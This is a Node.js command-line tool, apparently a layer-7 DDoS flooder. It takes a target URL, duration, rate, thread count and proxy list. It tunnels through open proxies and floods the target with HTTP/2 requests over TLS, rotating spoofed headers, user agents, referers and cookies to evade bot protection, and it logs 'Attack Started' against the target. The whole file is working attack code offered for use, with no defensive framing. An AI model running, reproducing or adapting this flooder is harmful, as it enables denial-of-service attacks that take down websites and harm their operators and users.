const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fakeua = require('fake-useragent');
 const color = require('gradient-string');
 const fs = require("fs");

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: ./capcha [target] [time] [rate] [thread] [proxyfile]\nMethods by levyxnet!`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 5000000);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 5000000);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();

 const ip_spoof1 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 5000000);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed1 = ip_spoof1();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256", 
    "ECDHE-ECDSA-CHACHA20-POLY1305", 
    "ECDHE-RSA-AES128-GCM-SHA256", 
    "ECDHE-RSA-CHACHA20-POLY1305", 
    "ECDHE-ECDSA-AES256-GCM-SHA384", 
    "ECDHE-RSA-AES256-GCM-SHA384"
 ];
 const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
 ]; 

 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  'en-GB,en;q=0.7'
 ];
 
 const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
 
 const control_header = ["no-cache", "max-age=500000000"];
 
 const refers = [
     "https://www.google.com/",
     "https://www.facebook.com/",
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "https://www.linkedin.com/",
     "https://proxyscrape.com/",
     "https://www.instagram.com/",
     "https://wwww.reddit.com/",
     "https://fivem.net/",
     "https://www.fbi.gov/",
     "https://nettruyenplus.com/",
     "https://vnexpress.net/",
     "https://zalo.me",
     "https://shopee.vn",
     "https://www.tiktok.com/",
     "https://google.com.vn/",
     "https://tuoitre.vn/",
     "https://thanhnien.vn/",
     "https://nettruyento.com/",
     "https://check-host.net",
     "https://cloudflare.com",
     'https://www.bssn.go.id/',
     'https://www.kominfo.go.id/',
     'https://www.dpr.go.id/',
     'https://www.fbi.gov/',
     'https://www.cia.gov/'
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
'Mozilla/5.0 (Windows NT 6.1; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.3; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 6.1; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.3; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
'Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.3; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.1; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.3; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 10.0; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.00) Gecko/20100101 Firefox/101.00',
'Mozilla/5.0 (Windows NT 6.1; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.3; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 10.0; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
'Mozilla/5.0 (Windows NT 6.1; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.3; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 10.0; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
'Mozilla/5.0 (Windows NT 6.1; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 6.3; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 10.0; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0'
 ];

 version = [
    '"Chromium";v="100", "Google Chrome";v="100"',
    '"(Not(A:Brand";v="8", "Chromium";v="98"',
    '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
    '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
    '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
    '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"'
 ];

  platform = [
    'Linux',
    'macOS',
    'Windows'
  ];
  
  site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame'
  ];
  
const rateHeaders = [
{ "akamai-origin-hop": randstr(5)  },
{ "source-ip": randstr(5)  },
{ "via": randstr(5)  },
{ "cluster-ip": randstr(5)  },
];
const rateHeaders2 = [
{ "akamai-origin-hop": randstr(5)  },
{ "source-ip": randstr(5)  },
{ "via": randstr(5)  },
{ "cluster-ip": randstr(5)  },
];

const useragentl = [
 '(CheckSecurity 2_0)',
 '(BraveBrowser 5_0)',
 '(ChromeBrowser 3_0)',
 '(ChromiumBrowser 4_0)',
 '(AtakeBrowser 2_0)',
 '(NasaChecker)',
 '(CloudFlareIUAM)',
 '(NginxChecker)',
 '(AAPanel)',
 '(AntiLua)',
 '(FushLua)',
 '(FBIScan)',
 '(FirefoxTop)',
 '(ChinaNet Bot)'
];

const mozilla = [
 'Mozilla/5.0 ',
 'Mozilla/6.0 ',
 'Mozilla/7.0 ',
 'Mozilla/8.0 ',
 'Mozilla/9.0 '
];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
 var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
 var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
 var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log(color('red', 'blue')('Attack Started to ' + process.argv[2]));
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = "no-cache";
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
 headers["sec-ch-ua-mobile"] = "?1";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = 'Mozilla/5.0 (Windows NT 6.1; rv:104.0) Gecko/20100101 Firefox/104.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0', 'Mozilla/5.0 (Windows NT 6.3; rv:104.0) Gecko/20100101 Firefox/104.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Windows NT 6.1; rv:100.0) Gecko/20100101 Firefox/100.0';
 headers["referer"] = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = dest1;
 headers["sec-fetch-user"] = "?1";
 headers["TE"] = "trailers";
 headers["cookie"] = '__gads=ID=5aa94fb83f51b15e-2281bc2fbae7006b:T=1691587735:RT=1695159062:S=ALNI_MZOOrSx-eW0eoKcCr1obUsUuHDxSw; __gpi=UID=00000c29bf4da4a2:T=1691587735:RT=1695159062:S=ALNI_MbRreNJ-uYMyj9DbNsEIN9hOJdzRw', '__gads=ID=a643d2eb7e5a1d7c-222369de26e300e6:T=1693161840:RT=1695124303:S=ALNI_MYEGaAPV1XRj7t0-yqcLDQ26ONBqw; __gpi=UID=00000c34e6ad6a0f:T=1693161840:RT=1695124303:S=ALNI_MaZphGHvqhWidGx3UrhD6IE1Vdp1g';
 headers["sec-fetch-site"] = site1;
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 300,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 200000);

         const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            //ALPNProtocols: ['h2','http/1.1','spdy/3.1'],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            //secureProtocol: "TLS_method",
            secureProtocol: ["TLSv1_1_method", "TLS_method","TLSv1_2_method", "TLSv1_3_method",],
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 120000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https://",
             settings: {
            headerTableSize: 3000000,
            maxConcurrentStreams: 3000000,
            initialWindowSize: 3000000,
            maxHeaderListSize: 3000000,
            enablePush: false
          },
             maxSessionMemory: 3000000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 3000000,
            maxConcurrentStreams: 3000000,
            initialWindowSize: 3000000,
            maxHeaderListSize: 3000000,
            enablePush: false
          });

     setInterval(() => {
         client.on("connect", () => {
              const dynHeaders = {
                ...headers,
                ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
                ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
              };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders)
                    
                    request.on("response", response => {
                        //console.log("Response:", response);
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);